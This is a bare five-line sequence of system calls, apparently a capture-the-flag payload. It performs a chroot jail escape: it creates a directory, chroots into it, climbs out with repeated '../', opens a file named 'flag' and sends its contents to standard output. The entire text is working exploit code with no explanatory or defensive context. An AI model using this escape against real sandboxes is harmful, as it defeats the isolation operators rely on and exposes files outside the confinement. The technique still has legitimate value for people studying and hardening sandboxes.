mkdir("escape",0);
chroot("escape");
chdir("../../../../../");
open("flag",0);
sendfile(1,4,0,0x40);